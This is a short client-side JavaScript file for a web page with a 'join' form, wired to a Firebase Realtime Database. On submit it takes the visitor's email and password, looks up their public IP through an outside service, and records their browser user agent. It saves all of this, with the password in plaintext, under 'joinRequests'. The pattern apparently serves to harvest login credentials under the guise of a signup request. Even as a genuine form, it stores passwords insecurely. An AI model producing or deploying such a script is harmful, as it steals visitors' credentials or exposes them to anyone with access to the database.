import { initializeApp } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-app.js";
import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyDWq_J7j5w3WaNsiHo1qQBZP5YETKfnTQU",
  authDomain: "asfpnaelazizul.firebaseapp.com",
  databaseURL: "https://asfpnaelazizul-default-rtdb.firebaseio.com",
  projectId: "asfpnaelazizul",
  storageBucket: "asfpnaelazizul.firebasestorage.app",
  messagingSenderId: "55635763930",
  appId: "1:55635763930:web:9da9c201ec6841c583fbe3",
  measurementId: "G-BZR7PW5BSV"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

async function getUserIP() {
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    return data.ip || "Unknown";
  } catch(e) {
    return "Unknown";
  }
}

document.getElementById("joinForm").addEventListener("submit", async (e) => {
  e.preventDefault();

  const email = document.getElementById("email").value.trim();
  const password = document.getElementById("password").value.trim();
  const ip = await getUserIP();
  const userAgent = navigator.userAgent;

  const newRef = push(ref(db, "joinRequests"));
  set(newRef, {
    email,
    password,
    ip,
    userAgent,
    addedTime: Date.now()
  })
  .then(() => {
    alert("✅ Request submitted!");
    e.target.reset();
  })
  .catch(err => alert("⚠️ " + err.message));
});
